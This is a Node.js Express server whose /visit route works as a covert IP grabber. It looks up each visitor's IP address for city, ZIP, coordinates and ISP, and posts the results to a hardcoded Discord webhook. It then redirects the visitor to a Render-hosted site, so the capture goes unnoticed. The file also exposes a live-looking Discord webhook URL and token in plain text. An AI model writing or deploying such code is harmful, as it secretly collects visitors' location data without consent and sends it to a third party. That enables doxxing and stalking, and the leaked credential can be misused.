const express = require("express");
const fetch = require("node-fetch");
const path = require("path");

const app = express();
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1405976093189607566/GFPsq97ZkBM9VD2OjZpq1Pzs2IDRTLsPsxcmHmIaEDnZic5w25ZvkQrGz7lf91Ub_roX";

// Serve static files if needed
app.use(express.static(path.join(__dirname, "public")));

// Tracking route
app.get("/visit", async (req, res) => {
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection.remoteAddress;

    try {
        const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=query,status,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname`);
        const geoData = await geoResponse.json();

        const payload = {
            content: `📢 New visitor detected!
🌐 IP: ${geoData.query}
✅ Status: ${geoData.status}
🌍 Continent: ${geoData.continent} (${geoData.continentCode})
🇨🇳 Country: ${geoData.country} (${geoData.countryCode})
🏙 Region/City: ${geoData.regionName}, ${geoData.city}
📍 District/ZIP: ${geoData.district}, ${geoData.zip}
🗺 Coordinates: ${geoData.lat}, ${geoData.lon}
⏱ Timezone/Offset: ${geoData.timezone}, ${geoData.offset}
💰 Currency: ${geoData.currency}
💻 ISP/Org: ${geoData.isp}, ${geoData.org}
🆔 AS/ASName: ${geoData.as}, ${geoData.asname}`
        };

        await fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        // Redirect user to your Render website
        res.redirect("https://wasted-potentials-management.onrender.com");
    } catch (err) {
        console.error(err);
        res.sendStatus(500);
    }
});

// Use Render's assigned port
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
